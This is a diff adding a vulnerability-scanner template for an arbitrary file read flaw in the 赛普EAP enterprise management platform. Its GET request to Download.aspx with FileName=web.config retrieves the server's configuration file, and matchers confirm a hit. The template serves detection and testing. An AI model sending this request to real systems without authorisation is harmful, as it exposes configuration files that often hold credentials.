@@ -1,0 +1,28 @@
+id: chinasap-eap-download-aspx-anyfile-read
+info:
+  name: 任意文件读取漏洞 - 赛普EAP企业适配管理平台
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    This template detects an arbitrary file read vulnerability in 赛普EAP企业适配管理平台 by sending a request to download the `web.config` file.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/IDWebSoft/Common/Handler/Download.aspx?FileName=web.config&FileTitle="
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<configuration>"
+          - "<system.web>"
+          - "web.config"
+        part: body
+      - type: regex
+        regex:
+          - "(?i)filename="
+        part: header
